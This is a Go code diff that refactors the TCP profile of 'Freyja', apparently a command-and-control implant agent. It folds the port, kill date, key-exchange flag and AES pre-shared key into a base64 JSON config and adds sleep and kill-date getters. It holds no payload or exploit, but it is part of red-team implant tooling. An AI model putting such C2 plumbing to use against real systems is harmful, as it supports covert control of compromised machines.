@@ -25,18 +25,14 @@ import (
 )
 
 // All variables must be a string so they can be set with ldflags
+var freyja_tcp_initial_config string
 
-// port to listen on
-var freyja_tcp_port string
-
-// killdate is the Killdate
-var freyja_tcp_killdate string
-
-// encrypted_exchange_check is Perform Key Exchange
-var freyja_tcp_encrypted_exchange_check string
-
-// AESPSK is the Crypto type
-var freyja_tcp_AESPSK string
+type TCPInitialConfig struct {
+	Port                   uint   `json:"port"`
+	Killdate               string `json:"killdate"`
+	EncryptedExchangeCheck bool   `json:"encrypted_exchange_check"`
+	AESPSK                 string `json:"AESPSK"`
+}
 
 type C2FreyjaTCP struct {
 	ExchangingKeys       bool                `json:"ExchangingKeys"`
@@ -54,15 +50,26 @@ type C2FreyjaTCP struct {
 }
 
 func init() {
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", freyja_tcp_killdate)
+	initialConfigBytes, err := base64.StdEncoding.DecodeString(freyja_tcp_initial_config)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to decode initial freyja_tcp_initial_config tcp config, exiting: %v\n", err))
+		os.Exit(1)
+	}
+	initialConfig := TCPInitialConfig{}
+	err = json.Unmarshal(initialConfigBytes, &initialConfig)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial freyja_tcp_initial_config tcp config, exiting: %v\n", err))
+		os.Exit(1)
+	}
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
 		os.Exit(1)
 	}
 	profile := C2FreyjaTCP{
-		Key:                  freyja_tcp_AESPSK,
-		Port:                 freyja_tcp_port,
-		ExchangingKeys:       freyja_tcp_encrypted_exchange_check == "true",
+		Key:                  initialConfig.AESPSK,
+		Port:                 fmt.Sprintf("%d", initialConfig.Port),
+		ExchangingKeys:       initialConfig.EncryptedExchangeCheck,
 		EgressTCPConnections: make(map[string]net.Conn),
 		FinishedStaging:      false,
 		Killdate:             killDateTime,
@@ -460,4 +467,13 @@ func (c *C2FreyjaTCP) GetSleepTime() int {
 		return -1
 	}
 	return 0
+}
+func (c *C2FreyjaTCP) GetSleepInterval() int {
+	return 0
+}
+func (c *C2FreyjaTCP) GetSleepJitter() int {
+	return 0
+}
+func (c *C2FreyjaTCP) GetKillDate() time.Time {
+	return c.Killdate
 }
